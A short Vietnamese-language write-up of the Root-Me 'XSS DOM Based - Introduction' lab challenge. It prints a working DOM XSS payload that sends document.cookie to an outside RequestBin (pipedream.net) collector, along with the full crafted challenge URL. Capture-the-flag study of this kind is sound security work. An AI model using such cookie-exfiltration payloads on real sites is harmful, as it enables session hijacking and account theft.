# WRITE UP

## **Challenge:** [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)

Sau khi thử submit, thì ta có thể xem được script của website:

<img src="./media/image1.png" style="width:6.5in;height:2.34861in" alt="Text Description automatically generated" />

Lúc này, tham số number sẽ đảm nhận nhận input. Ta thử kiểm tra XSS ở ô này bằng payload **‘;alert(1)//** thì thấy thành công:

<img src="./media/image2.png" style="width:6.5in;height:1.01875in" alt="Graphical user interface, text, application Description automatically generated" />

Ta sẽ dùng document.location để redirect website đến HTTP Request và payload để DOM based XSS như sau (ta dùng RequestBin tạo từ <https://requestbin.in>):

**';document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie;//**

<img src="./media/image3.png" style="width:6.5in;height:0.8375in" alt="Graphical user interface, text, application Description automatically generated" />

Website đã chuyển hướng thành công, giờ ta sẽ thực hiện POST lên bằng form bên tag contact:

<img src="./media/image4.png" style="width:6.5in;height:1.55972in" alt="Graphical user interface, text, application Description automatically generated" />

Ta thực hiện điền payload bên dưới đến POST lên và đợi cookie được trả về tại RequestBin:

<http://challenge01.root-me.org/web-client/ch32/?number=%27;document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie//>

<img src="./media/image5.png" style="width:6.5in;height:1.64444in" alt="Graphical user interface, application, Teams Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
